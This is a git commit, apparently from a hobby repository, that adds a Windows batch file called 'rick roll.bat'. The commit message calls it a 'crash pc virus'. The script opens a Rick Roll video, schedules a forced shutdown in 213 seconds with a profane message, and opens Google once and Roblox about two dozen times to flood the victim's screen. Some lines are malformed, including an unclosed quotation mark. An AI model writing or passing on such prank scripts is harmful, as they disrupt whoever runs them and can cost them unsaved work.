0eef9e1766976fb051105454f1dc164a568754b4
aa6859 <108300402+aa6859@users.noreply.github.com>
2022-10-08 19:45:43 +0200

    Add files via upload
    waring crash pc virus

---
+++ rick roll.bat
@@ -0,0 +1,29 @@
+@echo off
+start
+https://www.youtube.com/watch?v=dQw4w9WgXcQ
+shutdown -s -t 213 -c "You've just been rick rolled BITCH!
+start http://www.google.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
+start http://www.roblox.com
